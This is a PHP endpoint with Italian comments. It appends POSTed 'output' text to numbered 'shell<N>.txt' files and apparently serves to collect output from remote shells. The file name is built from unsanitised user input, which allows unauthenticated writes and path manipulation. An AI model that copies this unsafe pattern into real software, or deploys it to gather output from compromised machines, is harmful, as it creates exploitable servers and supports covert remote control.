<?php
// Nome del file in cui salvare i dati

$shellNo = $_POST["shellNo"];

$filename = 'shell'.$shellNo.'.txt';

// Verifica se il parametro POST 'output' è stato inviato
if (isset($_POST['output'])) {
    // Ottieni il valore del parametro 'output'
    $output = ";-" . $_POST['output'];

    // Aggiungi una nuova riga al contenuto
    $output .= PHP_EOL;

    // Apri il file in modalità append
    $file = fopen($filename, 'a');

    // Verifica se il file è stato aperto correttamente
    if ($file) {
        // Blocca il file
        if (flock($file, LOCK_EX)) {
            // Scrivi i dati nel file
            fwrite($file, $output);

            // Rilascia il lock
            flock($file, LOCK_UN);
        } else {
            // Risposta di errore se il file non può essere bloccato
            echo "Errore: non è stato possibile ottenere il lock sul file $filename.";
        }

        // Chiudi il file
        fclose($file);

        // Risposta di successo
        echo "Dati scritti correttamente in $filename.";
    } else {
        // Risposta di errore se il file non può essere aperto
        echo "Errore: non è stato possibile aprire il file $filename.";
    }
} else {
    // Risposta di errore se il parametro 'output' non è stato inviato
    echo "Errore: parametro 'output' mancante.";
}
?>
